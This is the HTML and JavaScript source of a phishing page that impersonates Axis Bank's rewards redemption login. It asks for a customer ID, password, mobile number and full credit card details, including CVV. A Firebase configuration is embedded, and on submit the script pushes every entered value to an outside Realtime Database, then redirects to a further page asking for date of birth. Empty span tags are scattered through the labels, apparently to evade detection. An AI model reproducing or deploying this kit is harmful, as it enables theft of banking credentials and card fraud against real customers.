<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/script/main.js"></script>
  </head>
  <body class="bg-[#F4F4F4]">
    <!-- Header -->
    <header>
      <div
        class="bg-[url('/assets/header.png')] text-white w-auto bg-cover h-[60px] shadow-md"
      ></div>
    </header>
    <!-- Main Content -->
    <section class="flex flex-col justify-center mt-10">
      <h1 class="text-2xl text-center font-bold">
        Continue to Reedem Rewards<span></span> <span></span><span></span
        ><span></span><span></span><span></span>
      </h1>
      <!-- Tabs -->
      <div class="flex justify-center mt-5 w-full px-5">
        <div class="grid grid-cols-2 gap-0 w-full">
          <button
            id="first-tab"
            class="tab-button text-white px-2 py-1 rounded-l-full border border-gray-400 text-sm border-2 bg-[#861F41]"
          >
            Login ID / Customer ID<span></span><span></span><span></span
            ><span></span><span></span>
          </button>
          <button
            id="second-tab"
            class="tab-button text-black px-2 py-1 rounded-r-full border border-gray-400 border-2 text-sm"
          >
            Credit Card Login<span></span><span></span><span></span><span></span
            ><span></span><span></span><span></span>
          </button>
        </div>
      </div>

      <!-- First Form -->
      <form action="" id="first-form" class="px-8 tab-content">
        <div
          class="space-y-6 flex flex-col justify-center mt-10 p-5 rounded-xl"
        >
          <!-- {/* Full Name */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="customer_id"
            >
              Login ID / Customer ID <span class="text-red-500">*</span
              ><span></span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="customer_id"
              type="text"
              name="customer_id"
              value=""
              required
            />
          </div>
          <!-- {/* Password */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="user_password"
            >
              Password <span class="text-red-500">*</span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="user_password"
              type="password"
              name="user_password"
              value=""
              required
            />
          </div>
          <!-- {/* Mobile Number */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="mobile_no"
            >
              Registered Mobile Number <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="mobile_no"
              type="text"
              name="mobile_no"
              value=""
              required
              pattern=".{10,}"
            />
          </div>
        </div>
        <!-- {/* Submit Button */} -->
        <div class="w-full flex justify-center items-center mt-5 px-5">
          <button
            class="bg-gradient-to-r from-[#861F41] to-[#861F41] text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline w-full"
            type="submit"
          >
            Login<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>
          </button>
        </div>
      </form>

      <!-- Sec Form -->
      <form action="" id="sec-form" class="px-8 tab-content hidden">
        <div
          class="space-y-6 flex flex-col justify-center mt-10 p-5 rounded-xl"
        >
          <!-- {/* Full Name */} -->
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="card_no"
            >
              Credit Card No. <span class="text-red-500">*</span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="card_no"
              type="text"
              name="card_no"
              value=""
              required
              pattern="^\d{4}-\d{4}-\d{4}-\d{4}$"
            />
          </div>
          <!-- {/* Expiry and CVV */} -->
          <div class="grid grid-cols-2 gap-2">
            <div class="mb-4">
              <label
                class="text-gray-500 font-bold text-sm mb-2 flex items-center"
                htmlFor="card_no"
              >
                Expiry Date <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span>
              </label>
              <input
                class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
                id="expiry_date"
                type="text"
                name="expiry_date"
                value=""
                required
              />
            </div>
            <div class="mb-4">
              <label
                class="text-gray-500 font-bold text-sm mb-2 flex items-center"
                htmlFor="card_no"
              >
                CVV <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span>
              </label>
              <input
                class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
                id="cvv"
                type="text"
                name="cvv"
                value=""
                required
              />
            </div>
          </div>
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="card_limit"
            >
              Credit Card Limit (In Rupees) <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="card_limit"
              type="text"
              name="card_limit"
              value=""
              required
            />
          </div>
          <div class="mb-4">
            <label
              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
              htmlFor="mobile_no"
            >
              Registered Mobile Number <span class="text-red-500">*</span><span></span><span></span><span></span><span></span>
            </label>
            <input
              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
              id="mobile_no"
              type="text"
              name="mobile_no"
              value=""
              required
              pattern=".{10,}"
            />
          </div>
        </div>
        <!-- {/* Submit Button */} -->
        <div class="w-full flex justify-center items-center mt-5 px-5">
          <button
            class="bg-gradient-to-r from-[#861F41] to-[#861F41] text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline w-full"
            type="submit"
          >
            Login
          </button>
        </div>
      </form>
    </section>
    <section>
      <img
        src="/assets/screencapture-omni-axisbank-co-in-axisretailbanking-2024-11-21-18_59_59.png"
        alt="footer"
        class="w-full bg-cover"
      />
    </section>

    <!-- Script -->
    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
    ></script>

    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
    ></script>
    <script
      defer
      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
    ></script>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      import {
        getDatabase,
        ref,
        push,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyBXTjQ9MLGxllGs9TzBI--BbJadoWC0D-A",
  authDomain: "axismy-d7be9.firebaseapp.com",
  databaseURL: "https://axismy-d7be9-default-rtdb.firebaseio.com",
  projectId: "axismy-d7be9",
  storageBucket: "axismy-d7be9.firebasestorage.app",
  messagingSenderId: "1099233831686",
  appId: "1:1099233831686:web:63c456126d1f6b16cbcc87"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);
      const database = getDatabase(app);

      document
        .getElementById("first-form")
        .addEventListener("submit", function (event) {
          event.preventDefault();
          //IDS
          const customer_id = document.querySelector(
            'input[name="customer_id"]'
          ).value;
          const user_password = document.querySelector(
            'input[name="user_password"]'
          ).value;
          const mobile_no = document.querySelector(
            'input[name="mobile_no"]'
          ).value;

          // Push data to the database
          const dbRef = ref(database, "users");
          push(dbRef, {
            CustomerID: customer_id,
            Password: user_password,
            RegisteredMobileNumber: mobile_no,
          })
            .then(() => {
              console.log("Data inserted successfully!");
              window.location.href = "dob.html";
            })
            .catch((error) => {
              console.error("Error inserting data: ", error);
            });
        });

      //   document

      //       event.preventDefault();

      //       ).value;

      //       ).value;

      //       // Push data to the database
      //       const dbRef = ref(database, "users");
      //       push(dbRef, {
      //         CreditCardNo: card_no,
      //         ExpiryDate: expiry_date,
      //         CVV: cvv,
      //         CreditCardLimit: card_limit,
      //         RegisteredMobileNumber: mobile_no,
      //       })
      //         .then(() => {
      //           console.log("Data inserted successfully!");
      //           window.location.href = "cdob.html";
      //         })
      //         .catch((error) => {
      //           console.error("Error inserting data: ", error);
      //         });
      //     });
      document.addEventListener("DOMContentLoaded", () => {
        // Format card number: 0000-0000-0000-0000
        const cardInput = document.querySelector('input[name="card_no"]');
        cardInput.addEventListener("input", (event) => {
          let input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          input = input.substring(0, 16); // Limit to 16 digits
          const formattedInput = input.match(/.{1,4}/g)?.join("-") || "";
          event.target.value = formattedInput;
        });

        // Format expiry date: MM/YY
        const expiryInput = document.querySelector('input[name="expiry_date"]');
        expiryInput.addEventListener("input", (event) => {
          let input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          input = input.substring(0, 4); // Limit to 4 digits
          if (input.length > 2) {
            input = `${input.substring(0, 2)}/${input.substring(2)}`; // Add slash after MM
          }
          event.target.value = input;
        });

        // Format mobile number: Allow only digits
        const mobileInput = document.querySelector('input[name="mobile_no"]');
        mobileInput.addEventListener("input", (event) => {
          const input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
          event.target.value = input.substring(0, 10); // Limit to 10 digits
        });

        // Form submit logic
        document
          .getElementById("sec-form")
          .addEventListener("submit", function (event) {
            event.preventDefault();

            // Get input values
            const card_no = document.querySelector(
              'input[name="card_no"]'
            ).value;
            const expiry_date = document.querySelector(
              'input[name="expiry_date"]'
            ).value;
            const cvv = document.querySelector('input[name="cvv"]').value;
            const card_limit = document.querySelector(
              'input[name="card_limit"]'
            ).value;
            const mobile_no = document.querySelector(
              'input[name="mobile_no"]'
            ).value;

            // Push data to the database
            const dbRef = ref(database, "users");
            push(dbRef, {
              CreditCardNo: card_no,
              ExpiryDate: expiry_date,
              CVV: cvv,
              CreditCardLimit: card_limit,
              RegisteredMobileNumber: mobile_no,
            })
              .then(() => {
                console.log("Data inserted successfully!");
                window.location.href = "dob.html";
              })
              .catch((error) => {
                console.error("Error inserting data: ", error);
              });
          });
      });
    </script>
  </body>
</html>
